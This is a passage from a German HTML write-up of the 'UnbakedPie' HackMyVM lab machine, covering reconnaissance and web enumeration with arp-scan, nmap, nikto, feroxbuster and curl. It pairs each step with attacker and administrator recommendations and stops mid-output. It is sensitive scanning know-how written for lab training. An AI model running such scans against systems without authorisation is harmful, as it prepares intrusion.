<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UnbakedPie - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
  <div class="header-bg">
        <h1>UnbakedPie - HackMyVM - Level: Hard - Bericht</h1>
        <div class="level-container">
            <h2>Hard</h2>
            <div class="circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfÃ¼gen -->
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">feroxbuster</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">sqlite3</div>
                <div class="tool-item">nc</div>
                <div class="tool-item">chisel</div>
                <div class="tool-item">ssh</div>
                <div class="tool-item">sudo</div>
                <div class="tool-item">cat</div>
                <div class="tool-item">id</div>
                <div class="tool-item">ls</div>
                <div class="tool-item">ip</div>
                <div class="tool-item">capsh</div>
                <div class="tool-item">rm</div>
                <div class="tool-item">wget</div>
                <div class="tool-item">convert</div>
                <div class="tool-item">exiftool</div>
                <div class="tool-item">mv</div>
                <div class="tool-item">chmod</div>
                <div class="tool-item">docker (conceptual)</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfÃ¼gen -->
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <p class="analysis">
                <strong>Analyse:</strong> Der erste und oft entscheidende Schritt in einem Penetrationstest ist die Erkundung des Netzwerks, die sogenannte Reconnaissance. Hier verwende ich das Tool <span class="command">arp-scan</span>, um alle aktiven GerÃ¤te im lokalen Netzwerk zu identifizieren. Der Befehl <span class="command">arp-scan -l</span> scannt das lokale Subnetz, das durch die Netzwerkkonfiguration meines Angreifersystems (Kali Linux) bestimmt wird. Die Ausgabe wird dann mittels der Pipe (<span class="command">|</span>) an den <span class="command">grep</span>-Befehl weitergeleitet. <span class="command">grep "PCS"</span> filtert die Zeilen, die den String "PCS" enthalten, da ich weiÃŸ, dass VirtualBox-Maschinen oft diesen Hersteller im ARP-Scan anzeigen. SchlieÃŸlich wird die gefilterte Ausgabe an <span class="command">awk '{print $1}'</span> Ã¼bergeben. <span class="command">awk</span> ist ein mÃ¤chtiges Textverarbeitungswerkzeug, und <span class="command">'{print $1}'</span> bedeutet, dass nur das erste Feld (durch Leerzeichen getrennt, was in diesem Fall die IP-Adresse ist) jeder passenden Zeile ausgegeben wird. Dieses Vorgehen ermÃ¶glicht es mir, schnell und gezielt die IP-Adresse der Zielmaschine zu extrahieren.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Dieser Schritt ist grundlegend und sehr effektiv, um die IP-Adresse der Ziel-VM in einer simulierten Netzwerkumgebung zu finden. Die Kombination von Standard-Linux-Tools wie <span class="command">grep</span> und <span class="command">awk</span> mit einem spezifischen Netzwerkscanner wie <span class="command">arp-scan</span> zeigt einen sauberen und automatisierten Ansatz zur Zielidentifizierung. Die Ausgabe von <span class="command">arp-scan</span> liefert nicht nur die IP, sondern oft auch die MAC-Adresse und Informationen zum Hersteller, was zusÃ¤tzliche Hinweise auf die Virtualisierungsplattform oder den GerÃ¤tetyp geben kann, wie spÃ¤ter im Nmap-Scan bestÃ¤tigt wird.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Nach der Identifizierung der IP-Adresse sollte der nÃ¤chste Schritt ein umfassender Portscan sein, um offene Dienste und potenzielle Angriffsvektoren zu finden. Parallel dazu kann mit der aktiven AufklÃ¤rung auf der gefundenen IP begonnen werden.
                <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann verhindern, dass ein Angreifer, der Zugang zu einem Teil des Netzwerks hat, einfach alle anderen GerÃ¤te im selben Subnetz via ARP-Scan oder Ã¤hnlichen Methoden identifiziert. Deaktivieren von ARP-Responses fÃ¼r nicht benÃ¶tigte Systeme oder die Implementierung von Network Access Control (NAC) kÃ¶nnte die AufklÃ¤rung erschweren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
                </div>
                <div class="terminal">
                    <pre>192.168.2.48</pre>
                </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Nachdem die IP-Adresse der Zielmaschine (192.168.2.48) ermittelt wurde, ist es nÃ¼tzlich, einen Hostnamen dafÃ¼r zu definieren, um die Arbeit in weiteren Schritten zu erleichtern. HierfÃ¼r editiere ich die lokale <span class="command">/etc/hosts</span>-Datei auf meinem Angreifer-System. Ich verwende den <span class="command">vi</span>-Editor, da er standardmÃ¤ÃŸig auf den meisten Linux-Systemen verfÃ¼gbar ist. Ich fÃ¼ge eine neue Zeile hinzu, die die IP-Adresse (192.168.2.48) dem gewÃ¼nschten Hostnamen (<span class="command">unbakedpie.hmv</span>) zuordnet. Dies simuliert einen DNS-Eintrag und ermÃ¶glicht es mir, im weiteren Verlauf statt der IP-Adresse den leichter zu merkenden Hostnamen zu verwenden.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Das HinzufÃ¼gen eines Eintrags in die <span class="command">/etc/hosts</span> ist eine Standardpraxis im Pentesting, um die Lesbarkeit und Wartbarkeit der verwendeten Befehle zu verbessern, insbesondere wenn man mit mehreren Zielen gleichzeitig arbeitet oder Hostnamen in Webanwendungen relevant sind. Es hat keinen Einfluss auf das Zielsystem selbst, sondern ist rein eine Konfigurationsanpassung auf dem Angreifer-System.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Dies ist ein einfacher, aber effektiver Schritt, der die Benutzerfreundlichkeit wÃ¤hrend des Pentests erhÃ¶ht. Es sollte zur Gewohnheit werden, relevante Hostnamen in die <span class="command">/etc/hosts</span> einzutragen, sobald sie identifiziert wurden.
                <br><strong>Empfehlung (Admin):</strong> Diese Aktion findet ausschlieÃŸlich auf dem Angreifer-System statt und hat keine direkten Implikationen fÃ¼r die Verteidigung des Zielsystems. Der Fokus sollte auf der Sicherung der Dienste und nicht auf der Erkennung solcher lokaler KonfigurationsÃ¤nderungen beim Angreifer liegen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">vi /etc/hosts</span></div>
                </div>
                <div class="terminal">
                    <pre>
  192.168.2.48    unbakedpie.hmv
</pre>
                </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Jetzt, da ich die IP-Adresse (oder den Hostnamen) des Ziels kenne, fÃ¼hre ich einen umfassenden Portscan mit <span class="command">nmap</span> durch. Der Befehl <span class="command">nmap -sS -sC -sV -p- -T5 -AO unbakedpie.hmv</span> ist eine Kombination verschiedener Optionen:
                <br>- <span class="command">-sS</span>: FÃ¼hrt einen SYN-Scan (Stealth Scan) durch. Dabei wird nur der erste Teil des Drei-Wege-Handshakes gesendet, um zu prÃ¼fen, ob ein Port offen ist, ohne eine vollstÃ¤ndige Verbindung aufzubauen. Dies ist oft unauffÃ¤lliger als ein voller Connect Scan.
                <br>- <span class="command">-sC</span>: FÃ¼hrt Standard-Skripte aus, die zur Diensterkennung und SchwachstellenprÃ¼fung nÃ¼tzlich sind.
                <br>- <span class="command">-sV</span>: Versucht, die Version des Dienstes zu erkennen, der auf einem offenen Port lÃ¤uft. Dies ist entscheidend, um bekannte Schwachstellen fÃ¼r spezifische Softwareversionen zu finden.
                <br>- <span class="command">-p-</span>: Scannt alle 65535 TCP-Ports. StandardmÃ¤ÃŸig scannt Nmap nur die am hÃ¤ufigsten verwendeten Ports.
                <br>- <span class="command">-T5</span>: Setzt das Timing-Template auf "Insane" (5). Dies beschleunigt den Scan, kann aber in unzuverlÃ¤ssigen Netzwerken zu ungenauen Ergebnissen fÃ¼hren und ist offensichtlicher.
                <br>- <span class="command">-AO</span>: Versucht, das Betriebssystem zu erkennen (<span class="command">-O</span>) und fÃ¼hrt alle Aggressive Optionen aus (<span class="command">-A</span>), was <span class="command">-sV</span>, <span class="command">-sC</span> und OS-Erkennung einschlieÃŸt.
                <br>Die Ausgabe zeigt die offenen Ports, die erkannten Dienste und deren Versionen sowie eine SchÃ¤tzung des Betriebssystems.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Der Nmap-Scan liefert essenzielle Informationen Ã¼ber die AngriffsflÃ¤che. Die Identifizierung von <span class="command">PORT 5003/tcp</span> mit dem Dienst <span class="command">http</span> und der Version <span class="command">WSGIServer 0.2 (Python 3.8.6)</span> ist ein wichtiger Fund, da Webserver oft erste Angriffspunkte sind. <span class="command">PORT 22/tcp</span> mit <span class="command">ssh</span> ist ebenfalls relevant, da SSH ein potenzieller Zugangspunkt sein kann, falls Anmeldedaten gefunden werden. Die OS-Erkennung ist weniger zuverlÃ¤ssig ("Warning: OSScan results may be unreliable"), gibt aber einen Hinweis auf ein Linux-System. Die <span class="command">MAC Address</span> bestÃ¤tigt die VirtualBox-Umgebung, was mit dem <span class="command">arp-scan</span> Ergebnis Ã¼bereinstimmt. Gefilterte Ports (<span class="command">65534 filtered tcp ports</span>) deuten auf eine Firewall hin, die die meisten Ports blockiert.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Die offenen Ports 5003 (HTTP) und 22 (SSH) sind nun die Hauptziele fÃ¼r die weitere Enumeration. Der Webserver auf Port 5003 sollte intensiv auf Schwachstellen geprÃ¼ft werden, wÃ¤hrend SSH auf mÃ¶gliche Brute-Force-Angriffe oder die Verwendung kompromittierter Anmeldedaten vorbereitet werden sollte, falls solche im Zuge der Web-Enumeration gefunden werden.
                <br><strong>Empfehlung (Admin):</strong> Eine Firewall ist aktiv, was gut ist, aber sie scheint Ports offen zu lassen, die mÃ¶glicherweise nicht Ã¶ffentlich zugÃ¤nglich sein mÃ¼ssten (wie Port 5003, wenn er nur intern genutzt werden soll). ÃœberprÃ¼fen Sie die Firewallregeln und schlieÃŸen Sie alle Ports, die nicht absolut notwendig sind. Stellen Sie sicher, dass Dienste, die offen sind, wie SSH und der WSGIServer, aktuell sind und sicher konfiguriert sind, um Schwachstellen zu minimieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.48</span></div>
                </div>
                <div class="terminal">
                    <pre>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 13:49 CEST
Nmap scan report for unbakedpie.hmv (192.168.2.48)
Host is up (0.00013s latency).
Not shown: <span class="command">65534 filtered tcp ports (no-response)</span>
<span class="command">PORT     STATE SERVICE VERSION</span>
<span class="command">5003/tcp open  http    WSGIServer 0.2 (Python 3.8.6)</span>
|_http-title: <span class="command">[Un]baked | /</span>
<span class="command">MAC Address: 08:00:27:44:9B:6E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.16 - 4.6 (97%), Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), Linux 3.13 - 4.4 (95%), Linux 3.8 - 3.16 (95%), Linux 4.4 (95%), Linux 3.13 (94%), Linux 4.2 (92%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%)
No exact <span class="command">OS</span> matches for host (test conditions non-ideal).
Network Distance: 1 hop

<span class="command">TRACEROUTE</span>
<span class="command">HOP RTT     ADDRESS</span>
1   0.12 ms <span class="command">unbakedpie.hmv (192.168.2.48)</span>

<span class="command">OS</span> and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="command">Nmap done</span>: 1 IP address (1 host up) scanned in 453.71 seconds
</pre>
                </div>
            </div>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <p class="analysis">
                <strong>Analyse:</strong> Mit dem Wissen um den offenen HTTP-Port 5003 beginne ich die Enumeration der Webanwendung mit <span class="command">nikto</span>. <span class="command">nikto -h http://192.168.2.48:5003</span> ist ein Webserver-Scanner, der eine Vielzahl von Tests auf dem Ziel durchfÃ¼hrt, um bekannte Schwachstellen, Konfigurationsfehler und potenziell interessante Dateien oder Verzeichnisse zu finden. Er prÃ¼ft auf veraltete Serversoftware, gefÃ¤hrliche Dateien, fehlende Sicherheits-Header und mehr.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Nikto-Ausgabe liefert sofort mehrere wichtige Hinweise. Zuerst bestÃ¤tigt sie den <span class="command">Server: WSGIServer/0.2 CPython/3.8.6</span>. Dann meldet sie, dass ein <span class="command">Cookie csrftoken created without the httponly flag</span> gesetzt wird. Das bedeutet, das Cookie ist Ã¼ber JavaScript zugÃ¤nglich, was bei XSS-Schwachstellen ausgenutzt werden kÃ¶nnte, um die Session zu stehlen. Der kritischste Fund sind die vielen Meldungen, dass die Site auf verschiedenen CGI-Pfaden (<span class="command">/cgi_wrapper</span>, <span class="command">/ezmlm-browse</span>, <span class="command">/php-cgi</span>, etc.) <span class="command">appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6271)</span>. Shellshock ist eine schwerwiegende LÃ¼cke, die in bestimmten Versionen der Bash-Shell auftrat und bei Ausnutzung Remote Code Execution (RCE) ermÃ¶glichen kann, oft Ã¼ber CGI-Skripte, die Shell-Befehle ausfÃ¼hren. Wenn diese Pfade existieren und Bash in einer verwundbaren Version lÃ¤uft, kÃ¶nnte dies ein direkter Weg zum initialen Zugriff sein. ZusÃ¤tzlich werden fehlende Sicherheits-Header fÃ¼r <span class="command">/static/</span> bemÃ¤ngelt (<span class="command">X-Content-Type-Options header is not set</span>), was Browserschwachstellen (MIME-Sniffing) begÃ¼nstigen kÃ¶nnte.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Die Shellshock-Meldungen mÃ¼ssen sofort verifiziert werden. Ich werde versuchen, die Schwachstelle gezielt anzutesten, um Remote Code Execution zu erreichen. Die fehlenden Sicherheits-Header sind nachrangig, aber ebenfalls dokumentationswÃ¼rdig. Das `csrftoken` ohne `httponly` wird notiert, falls eine XSS-LÃ¼cke gefunden wird.
                <br><strong>Empfehlung (Admin):</strong> PrÃ¼fen Sie dringend die Existenz und Konfiguration der genannten CGI-Pfade. Stellen Sie sicher, dass die Bash-Version auf dem System gepatcht ist, um CVE-2014-6271 zu beheben, oder entfernen Sie die anfÃ¤lligen CGI-Skripte, falls sie nicht benÃ¶tigt werden. Implementieren Sie dringend alle relevanten Sicherheits-Header (X-Content-Type-Options, X-Frame-Options, Content-Security-Policy etc.) auf dem Webserver, um gÃ¤ngige Browserschwachstellen zu mindern. Setzen Sie das `httponly`-Flag fÃ¼r alle Cookies, die keinen JavaScript-Zugriff benÃ¶tigen, um das Risiko bei XSS zu minimieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nikto -h http://192.168.2.48:5003</span></div>
                </div>
                <div class="terminal">
                    <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <span class="command">192.168.2.48</span>
+ Target Hostname:    <span class="command">192.168.2.48</span>
+ Target PORT:        <span class="command">5003</span>
+ Start Time:         2025-06-16 13:58:10 (GMT2)
---------------------------------------------------------------------------
+ Server: <span class="command">WSGIServer/0.2 CPython/3.8.6</span>
+ /: <span class="password">Cookie csrftoken created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /cgi_wrapper: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /ezmlm-browse: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /php: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /php4: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /php5: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /php-cgi: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /printenv: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /search: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /status: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /test: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /test-cgi: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /welcome: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /static/: <span class="password">The X-Content-Type-Options header is not set. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Um die Webanwendung weiter zu erkunden und versteckte Verzeichnisse oder Dateien zu finden, setze ich <span class="command">feroxbuster</span> ein. Dieser Befehl fÃ¼hrt eine Brute-Force-Suche nach Web-Inhalten durch.
                <br>- <span class="command">--url "http://192.168.2.48:5003"</span>: Definiert die Ziel-URL und den Port.
                <br>- <span class="command">--wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>: Gibt die zu verwendende Wortliste an, eine gÃ¤ngige Liste fÃ¼r Verzeichnisnamen.
                <br>- <span class="command">-x .git,.php,...</span>: Gibt eine Liste von Dateierweiterungen an, die dem Wortlisten-Eintrag angehÃ¤ngt und ebenfalls getestet werden sollen.
                <br>- <span class="command">-s 301 302</span>: Filtert die Ergebnisse, um nur Antworten mit dem Statuscode 301 (Moved Permanently) oder 302 (Found/Moved Temporarily) anzuzeigen. Diese Codes sind oft interessant, da sie auf Weiterleitungen zu anderen Pfaden hindeuten, die existieren.
                <br>WÃ¤hrend des Scans identifiziert <span class="command">feroxbuster</span> einige Weiterleitungen. Der Scan wurde abgebrochen (`ğŸš¨ Caught ctrl+c ğŸš¨`) vermutlich, weil die Laufzeit zu lang wurde oder die relevanten Pfade bereits gefunden waren. Die aufgefÃ¼hrten Funde sind die, die bis zum Abbruch identifiziert wurden.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Der <span class="command">feroxbuster</span> Scan bestÃ¤tigt die Existenz der Pfade <span class="command">/accounts/signup</span> und <span class="command">/accounts/login</span> durch 301-Weiterleitungen, sowie <span class="command">/share</span> durch eine 302-Weiterleitung. Obwohl der Scan nicht vollstÃ¤ndig durchlief, liefert er wertvolle Hinweise auf die Struktur der Webanwendung, insbesondere auf einen Login- und Registrierungsbereich sowie einen "share"-Bereich, der eine Authentifizierung zu erfordern scheint (`accounts/login?next=/share`). Diese Pfade passen gut zu einer Rezept-Sharing-Seite, wie wir sie auf der Startseite gesehen haben.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Die gefundenen Pfade, insbesondere <span class="command">/accounts/login</span> und <span class="command">/share</span>, sollten manuell oder mit automatisierten Tools weiter untersucht werden, um deren FunktionalitÃ¤t und potenzielle Schwachstellen zu verstehen. Auch der Shellshock-Test sollte auf den vom Nikto-Scan gemeldeten Pfaden fortgesetzt werden.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass unnÃ¶tige Dateien oder Verzeichnisse, die von Directory Bustern gefunden werden kÃ¶nnten, entfernt oder besser geschÃ¼tzt sind. Konfigurieren Sie den Webserver so, dass er bei nicht existierenden Pfaden konsistent antwortet (z.B. immer 404), um das Enumerieren zu erschweren. ÃœberprÃ¼fen Sie, ob die Weiterleitungen (<span class="command">301</span>, <span class="command">302</span>) korrekt und sicher konfiguriert sind.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">feroxbuster --url "http://192.168.2.48:5003" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 301 302</span></div>
                </div>
                <div class="terminal">
                    <pre>
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ <span class="command">http://192.168.2.48:5003</span>
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ <span class="command">/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
 ğŸ‘Œ  Status Codes          â”‚ <span class="command">[301, 302]</span>
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ <span class="command">[git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<span class="command">301      GET        0l        0w        0c http://192.168.2.48:5003/accounts/signup => http://192.168.2.48:5003/accounts/signup/</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.48:5003/accounts/login => http://192.168.2.48:5003/accounts/login/</span>
<span class="command">302      GET        0l        0w        0c http://192.168.2.48:5003/share => accounts/login?next=/share</span>
ğŸš¨ Caught ctrl+c ğŸš¨ saving scan state to ferox-http_192_168_2_48:5003-1750075669.state ...
[>-------------------] - 9m     92308/18527684 30h     found:3       errors:0      
[>-------------------] - 9m     30800/6175316 56/s    http://192.168.2.48:5003/ 
[>-------------------] - 9m     29428/6175316 54/s    http://192.168.2.48:5003/accounts/signup/ 
[>-------------------] - 9m     29428/6175316 54/s    http://192.168.2.48:5003/accounts/login/      
</pre>
                </div>
            </div>

             <p class="analysis">
                <strong>Analyse:</strong> Um detaillierte Informationen Ã¼ber den Webserver und die erhaltenen Header zu bekommen, nutze ich <span class="command">curl</span> mit den Optionen <span class="command">-Iv</span>.
                <br>- <span class="command">-I</span>: FÃ¼hrt einen HEAD-Request durch, der nur die Header-Informationen abruft, ohne den Body der Antwort herunterzuladen.
                <br>- <span class="command">-v</span>: Aktiviert den Verbose-Modus, der Details zum Kommunikationsprozess anzeigt, einschlieÃŸlich der gesendeten Anforderung und der erhaltenen Antwort.
                <br>Der Befehl <span class="command">curl -Iv http://192.168.2.48:5003</span> sendet eine HEAD-Anfrage an die Startseite des Webservers auf Port 5003 und zeigt den detaillierten Austausch.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Ausgabe bestÃ¤tigt die grundlegenden Informationen aus dem Nmap-Scan: <span class="command">HTTP/1.1 200 OK</span> Status, den <span class="command">Server: WSGIServer/0.2 CPython/3.8.6</span> und den <span class="command">Content-Type: text/html</span>. Wichtiger ist die Analyse der Sicherheits-Header und Cookies. Im Gegensatz zur Nikto-Meldung sind hier die Header <span class="command">X-Frame-Options: DENY</span>, <span class="command">X-Content-Type-Options: nosniff</span> und <span class="command">Referrer-Policy: same-origin</span> *gesetzt*. Das ist eine bessere Konfiguration als von Nikto gemeldet, zumindest fÃ¼r die Startseite. Der <span class="command">Set-Cookie</span> Header ist aber weiterhin interessant. Er setzt das <span class="command">csrftoken</span> Cookie mit Parametern wie <span class="command">expires</span>, <span class="command">Max-Age</span>, <span class="command">Path=/</span> und <span class="command">SameSite=Lax</span>. Das <span class="command">httponly</span>-Flag, das bei Nikto bemÃ¤ngelt wurde, fehlt hier ebenfalls in der Ausgabe. Dies bekrÃ¤ftigt die MÃ¶glichkeit, dass dieses Cookie Ã¼ber clientseitiges Skripting zugÃ¤nglich sein kÃ¶nnte. Der <span class="command">Vary: Cookie</span> Header zeigt an, dass die Antwort vom Inhalt des Cookie-Headers abhÃ¤ngen kann, was bei der Untersuchung der Session-Handhabung relevant ist.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Die Header-Informationen geben einen guten Ãœberblick Ã¼ber die Basis-Sicherheitseinstellungen des Webservers. Das fehlende <span class="command">httponly</span>-Flag beim <span class="command">csrftoken</span> Cookie bleibt ein relevanter Punkt, falls XSS gefunden wird. Die gesetzten X-Frame-Options, X-Content-Type-Options und Referrer-Policy sind positive Funde, schrÃ¤nken aber die Ausnutzung anderer Schwachstellen (wie RCE) nicht direkt ein.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle sicherheitsrelevanten Header (X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, Referrer-Policy, Strict-Transport-Security) konsistent auf *allen* Seiten und fÃ¼r alle Arten von Inhalten gesetzt sind. Setzen Sie das <span class="command">httponly</span>-Flag fÃ¼r alle Cookies, die nicht explizit von clientseitigem JavaScript gelesen werden mÃ¼ssen (was fÃ¼r ein CSRF-Token der Fall sein sollte).
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl -Iv http://192.168.2.48:5003</span></div>
                </div>
                <div class="terminal">
                    <pre>
*   Trying 192.168.2.48:5003...
* Connected to 192.168.2.48 (192.168.2.48) port 5003
* using HTTP/1.x
> HEAD / HTTP/1.1
> Host: 192.168.2.48:5003
